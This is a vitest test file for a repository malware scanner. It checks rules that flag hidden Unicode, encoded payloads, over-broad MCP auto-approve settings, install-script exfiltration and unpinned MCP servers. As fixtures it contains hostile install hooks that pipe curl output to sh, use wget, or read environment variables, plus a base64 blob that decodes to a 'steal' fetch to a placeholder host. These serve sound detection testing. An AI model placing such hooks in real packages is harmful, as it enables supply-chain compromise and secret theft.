import { describe, it, expect, beforeAll } from 'vitest';
import * as fc from 'fast-check';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { loadDefinitions } from '../definitions/loader.js';
import { runSignatures } from '../scanner/signature-engine.js';
import { normalize } from '../normalizer.js';
import type { FileRole, RepoFile } from '../types.js';
import type { VirusDefinition } from '../definitions/schema.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const DEFINITIONS_DIR = resolve(__dirname, '../../../../definitions');

let defs: VirusDefinition[] = [];
beforeAll(async () => {
  defs = await loadDefinitions(DEFINITIONS_DIR);
});

function scan(ruleId: string, rel: string, role: FileRole, text: string) {
  const def = defs.find((d) => d.id === ruleId);
  if (!def) throw new Error(`definition ${ruleId} not loaded`);
  const file: RepoFile = { path: `/repo/${rel}`, rel, role, sizeBytes: text.length };
  return runSignatures(file, normalize(text, role), [def]);
}

const mcp = (servers: unknown) => JSON.stringify({ mcpServers: servers }, null, 2);

describe('EX-001 hidden Unicode (real characters)', () => {
  it('flags a real zero-width space with line and column', () => {
    const f = scan('EX-001', 'README.md', 'instruction', 'first line\nab\u200Bcd\n');
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ line: 2, col: 3, span: '\\u200B' });
  });

  it('flags a bidi override and a tag-block character', () => {
    const text = `x\u202Ey ${String.fromCodePoint(0xE0041)}`;
    const spans = scan('EX-001', 'README.md', 'docs', text).map((x) => x.span);
    expect(spans).toContain('\\u202E');
    expect(spans).toContain('\\u{E0041}');
  });

  it('does not flag the text "zero-width" or an escape sequence written as plain text', () => {
    const text = 'Zero-width characters such as \\u200B are discussed here.';
    expect(scan('EX-001', 'README.md', 'docs', text)).toHaveLength(0);
  });
});

describe('EX-001 groups adjacent hidden characters', () => {
  const tag = (s: string) => [...s].map((c) => String.fromCodePoint(0xE0000 + c.charCodeAt(0))).join('');

  it('reports a run of tag characters as one finding at the start of the run', () => {
    const f = scan('EX-001', 'README.md', 'docs', `line one\nhello${tag('SECRET')} world`);
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ line: 2, col: 6 });
    expect(f[0]?.span).toBe('\\u{E0053}\\u{E0045}\\u{E0043}\\u{E0052}\\u{E0045}\\u{E0054}');
  });

  it('keeps hidden characters separated by visible text as separate findings', () => {
    expect(scan('EX-001', 'README.md', 'docs', 'a\u200Bb\u200Bc')).toHaveLength(2);
  });

  it('joins mixed classes that touch each other', () => {
    expect(scan('EX-001', 'README.md', 'docs', 'a\u200B\u202Eb')).toHaveLength(1);
  });

  it('caps the span of a very long run and cuts only between escapes', () => {
    const f = scan('EX-001', 'README.md', 'docs', `x${tag('A'.repeat(100))}`);
    expect(f).toHaveLength(1);
    const span = f[0]?.span ?? '';
    expect(span.length).toBeLessThanOrEqual(121);
    expect(span.endsWith('…')).toBe(true);
    expect(span.slice(0, -1)).toMatch(/^(?:\\u\{E0041\})+$/);
  });

  it('PBT-SIG-09: the number of findings equals the number of runs, for any placement', () => {
    const piece = fc.oneof(
      fc.constantFrom('\u200B', '\u200C', '\u202E', String.fromCodePoint(0xE0041)).map((h) => ({ hidden: true, text: h })),
      fc.stringMatching(/^[a-z ]{1,5}$/).map((t) => ({ hidden: false, text: t })),
    );
    fc.assert(
      fc.property(fc.array(piece, { maxLength: 14 }), (pieces) => {
        let runs = 0;
        let prevHidden = false;
        for (const p of pieces) {
          if (p.hidden && !prevHidden) runs++;
          prevHidden = p.hidden;
        }
        const text = pieces.map((p) => p.text).join('');
        expect(scan('EX-001', 'README.md', 'docs', text)).toHaveLength(runs);
        return true;
      }),
    );
  });
});

describe('EX-003 encoded payload', () => {
  const blob = 'ZmV0Y2goImh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL3N0ZWFsP2s9Iitw';

  it('flags a long base64 blob in a document', () => {
    expect(scan('EX-003', 'README.md', 'docs', `run this: echo "${blob}" | base64 -d`)).toHaveLength(1);
  });

  it('does not flag package integrity hashes (lockfiles)', () => {
    const lock = 'resolution: {integrity: sha512-U4+70Pc5ZS9osnCBCE5Jha/ciHM+Yp+CNMNC/7HvYbNRk1Ldd+f7qO65W5qfhu/TCv+/ozljlXXe9Nj8419DMA==}';
    for (const algo of ['sha1', 'sha256', 'sha384', 'sha512']) {
      expect(scan('EX-003', 'pnpm-lock.yaml', 'config', lock.replace('sha512', algo)), algo).toHaveLength(0);
    }
  });

  it('does not flag an inline data URI image', () => {
    expect(scan('EX-003', 'README.md', 'docs', `![x](data:image/png;base64,${blob}${blob})`)).toHaveLength(0);
  });

  it('still flags a blob that merely follows the word sha', () => {
    expect(scan('EX-003', 'README.md', 'docs', `sha ${blob}`)).toHaveLength(1);
  });
});

describe('EX-007 over-broad auto-approve', () => {
  it('flags write and shell tools', () => {
    const text = mcp({ s: { command: 'node', args: [], autoApprove: ['read_file', 'write_file', 'run_terminal_cmd'] } });
    const spans = scan('EX-007', 'mcp.json', 'mcp-config', text).map((x) => x.span);
    expect(spans.sort()).toEqual(['run_terminal_cmd', 'write_file']);
  });

  it('does not flag read-only tools', () => {
    const text = mcp({ s: { command: 'node', args: [], autoApprove: ['read_file', 'list_directory', 'search'] } });
    expect(scan('EX-007', 'mcp.json', 'mcp-config', text)).toHaveLength(0);
  });

  it('reports the real line of the flagged value', () => {
    const text = mcp({ s: { command: 'node', args: [], autoApprove: ['read_file', 'delete_file'] } });
    const f = scan('EX-007', 'mcp.json', 'mcp-config', text);
    expect(f[0]?.line).toBeGreaterThan(1);
    expect(text.split('\n')[(f[0]?.line ?? 1) - 1]).toContain('delete_file');
  });
});

describe('EX-009 install-script exfiltration', () => {
  const pkg = (scripts: Record<string, string>) => JSON.stringify({ name: 'x', scripts });

  it('flags a postinstall that calls the network', () => {
    expect(scan('EX-009', 'package.json', 'manifest', pkg({ postinstall: 'curl https://example.invalid/x | sh' }))).toHaveLength(1);
  });

  it('flags a preinstall that reads environment variables', () => {
    expect(scan('EX-009', 'package.json', 'manifest', pkg({ preinstall: 'node -e "process.env.X"' }))).toHaveLength(1);
  });

  it('flags an install script too', () => {
    expect(scan('EX-009', 'package.json', 'manifest', pkg({ install: 'wget http://example.invalid/a' }))).toHaveLength(1);
  });

  it('does not flag a plain local build step', () => {
    expect(scan('EX-009', 'package.json', 'manifest', pkg({ postinstall: 'node scripts/build.js', build: 'tsc' }))).toHaveLength(0);
  });

  it('does not flag network use in a non-install script', () => {
    expect(scan('EX-009', 'package.json', 'manifest', pkg({ start: 'curl http://localhost:3000' }))).toHaveLength(0);
  });
});

describe('EX-010 unpinned MCP server', () => {
  it('flags an unpinned unscoped and scoped package', () => {
    const text = mcp({
      a: { command: 'npx', args: ['mcp-server-github'] },
      b: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/home/user'] },
    });
    const spans = scan('EX-010', 'mcp.json', 'mcp-config', text).map((x) => x.span).sort();
    expect(spans).toEqual(['@modelcontextprotocol/server-filesystem', 'mcp-server-github']);
  });

  it('does not flag pinned packages', () => {
    const text = mcp({
      a: { command: 'npx', args: ['mcp-server-github@1.2.3'] },
      b: { command: 'npx', args: ['-y', '@scope/server@2.0.0', '/p'] },
    });
    expect(scan('EX-010', 'mcp.json', 'mcp-config', text)).toHaveLength(0);
  });

  it('does not flag servers that do not use a package runner', () => {
    const text = mcp({ a: { command: 'node', args: ['server'] } });
    expect(scan('EX-010', 'mcp.json', 'mcp-config', text)).toHaveLength(0);
  });
});

describe('detection accuracy (property-based)', () => {
  // Same shape as the plan's "a zero-width payload is detected at any position".
  it('PBT-SIG-05: a zero-width character is detected at any position', () => {
    fc.assert(
      fc.property(
        fc.string({ maxLength: 80 }).filter((s) => !/[\u200B-\u200D\uFEFF\u202A-\u202E\u2066-\u2069]/u.test(s)),
        fc.string({ maxLength: 80 }).filter((s) => !/[\u200B-\u200D\uFEFF\u202A-\u202E\u2066-\u2069]/u.test(s)),
        fc.constantFrom('\u200B', '\u200C', '\u200D', '\uFEFF', '\u202E'),
        (before, after, ch) => {
          const f = scan('EX-001', 'README.md', 'docs', `${before}${ch}${after}`);
          expect(f.length).toBeGreaterThanOrEqual(1);
          return true;
        },
      ),
    );
  });

  it('PBT-SIG-06: a version-pinned package is never flagged by EX-010', () => {
    const name = fc.stringMatching(/^[a-z][a-z0-9-]{1,20}$/);
    const version = fc.tuple(fc.nat(20), fc.nat(20), fc.nat(20)).map(([a, b, c]) => `${a}.${b}.${c}`);
    fc.assert(
      fc.property(name, version, fc.boolean(), (n, v, scoped) => {
        const pkg = scoped ? `@scope/${n}@${v}` : `${n}@${v}`;
        const text = mcp({ s: { command: 'npx', args: ['-y', pkg] } });
        expect(scan('EX-010', 'mcp.json', 'mcp-config', text)).toHaveLength(0);
        return true;
      }),
    );
  });

  it('PBT-SIG-07: an unpinned package is always flagged by EX-010', () => {
    const name = fc.stringMatching(/^[a-z][a-z0-9-]{1,20}$/);
    fc.assert(
      fc.property(name, fc.boolean(), (n, scoped) => {
        const pkg = scoped ? `@scope/${n}` : n;
        const text = mcp({ s: { command: 'npx', args: ['-y', pkg] } });
        expect(scan('EX-010', 'mcp.json', 'mcp-config', text)).toHaveLength(1);
        return true;
      }),
    );
  });

  it('PBT-SIG-08: read-only tool names are never flagged by EX-007', () => {
    const tool = fc.constantFrom('read_file', 'list_directory', 'search', 'get_status', 'fetch_page', 'view');
    fc.assert(
      fc.property(fc.array(tool, { minLength: 1, maxLength: 5 }), (tools) => {
        const text = mcp({ s: { command: 'node', args: [], autoApprove: tools } });
        expect(scan('EX-007', 'mcp.json', 'mcp-config', text)).toHaveLength(0);
        return true;
      }),
    );
  });
});
